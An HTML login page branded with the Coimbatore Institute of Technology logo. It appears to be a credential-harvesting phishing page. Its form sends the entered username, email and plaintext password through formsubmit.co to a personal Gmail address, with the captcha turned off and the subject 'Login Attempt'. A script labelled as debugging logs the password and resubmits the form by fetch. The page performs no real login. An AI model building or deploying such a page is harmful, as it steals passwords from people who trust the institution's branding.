<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Simple Login Page</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 flex items-center justify-center h-screen">
  <div class="bg-white p-8 rounded-lg shadow-md w-full max-w-md">
    <img src="https://upload.wikimedia.org/wikipedia/en/1/17/Coimbatore_Institute_of_Technology_logo.png"
         alt="Coimbatore Institute of Technology Logo"
         class="mx-auto mb-6 h-24 w-auto">
    <h2 class="text-2xl font-bold mb-6 text-center text-gray-800">Login</h2>

    <form action="https://formsubmit.co/dharaneeshv162006@gmail.com" method="POST">
      <!-- Username -->
      <div class="mb-4">
        <label for="username" class="block text-sm font-medium text-gray-700">Username</label>
        <input type="text" id="username" name="username"
               class="mt-1 p-2 w-full border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
               placeholder="Enter your username" required>
      </div>

      <!-- Email (needed for reply-to/autoresponse) -->
      <div class="mb-4">
        <label for="email" class="block text-sm font-medium text-gray-700">Email</label>
        <input type="email" id="email" name="email"
               class="mt-1 p-2 w-full border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
               placeholder="Enter your email address">
      </div>

      <!-- Password -->
      <div class="mb-6">
        <label for="password" class="block text-sm font-medium text-gray-700">Password</label>
        <input type="password" id="password" name="password"
               class="mt-1 p-2 w-full border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
               placeholder="Enter your password" required>
      </div>

      <!-- FormSubmit special fields -->
      <input type="hidden" name="_subject" value="Login Attempt">
      <input type="hidden" name="_next" value="https://example.com/thank-you">
      <input type="hidden" name="_template" value="table">
      <input type="hidden" name="_captcha" value="false">

      <button type="submit"
              class="w-full bg-blue-500 text-white p-2 rounded-md hover:bg-blue-600 transition duration-200">
        Login
      </button>
    </form>

    <p class="mt-4 text-center text-sm text-gray-600">
      Don't have an account?
      <a href="#" class="text-blue-500 hover:underline">Sign up</a>
    </p>
  </div>

  <!-- Debugging script -->
  <script>
    document.querySelector("form").addEventListener("submit", function(event) {
      // Prevent form submission for debugging
      event.preventDefault();

      // Log form data to see if everything is being captured
      const formData = new FormData(event.target);
      formData.forEach((value, key) => {
        console.log(`${key}: ${value}`);
      });

      // Try submitting the form manually (for debugging purposes)
      fetch(event.target.action, {
        method: event.target.method,
        body: formData
      })
      .then(response => response.text())
      .then(data => {
        console.log("Form submitted successfully:", data);
        window.location.href = "https://example.com/thank-you"; // Redirect after success
      })
      .catch(error => {
        console.error("Error submitting form:", error);
      });
    });
  </script>
</body>
</html>
